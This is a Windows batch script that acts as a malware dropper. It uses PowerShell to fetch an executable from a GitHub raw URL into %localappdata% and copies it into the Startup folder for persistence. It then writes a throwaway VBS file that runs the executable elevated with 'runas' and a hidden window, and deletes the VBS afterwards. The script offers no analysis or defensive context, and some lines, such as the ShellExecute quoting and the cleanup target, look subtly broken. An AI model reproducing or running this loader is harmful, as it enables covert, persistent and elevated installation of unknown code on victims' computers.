@echo off

:: Define Parameters
set filename=fbf12e4f.exe
set download_link=https://raw.githubusercontent.com/claykrs/claykers/main/fbf12e4f.exe
set startup=Y
set elevation=Y
set invisibility=Y
set mutex=Y

:: Download file if not already present
if not exist "%localappdata%\%filename%" (
    powershell -command wget "%download_link%" -OutFile "%localappdata%\%filename%"
)

:: Handle Startup (copy to startup folder)
if %startup%==Y (
    copy "%localappdata%\%filename%" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup"
)

:: Handle Elevation (run as admin)
if %elevation%==Y (
    set M=runas
)

:: Handle Invisibility (run without a window)
if %invisibility%==Y (
    set N=0
)

:: Launch the Application
echo CreateObject("Shell.Application").ShellExecute "%localappdata%\%filename%","",","%M%","%N%" > "%filename%.vbs"
"%filename%.vbs"
timeout /t 1 /nobreak
del "%filename%"
del "%filename%.vbs"
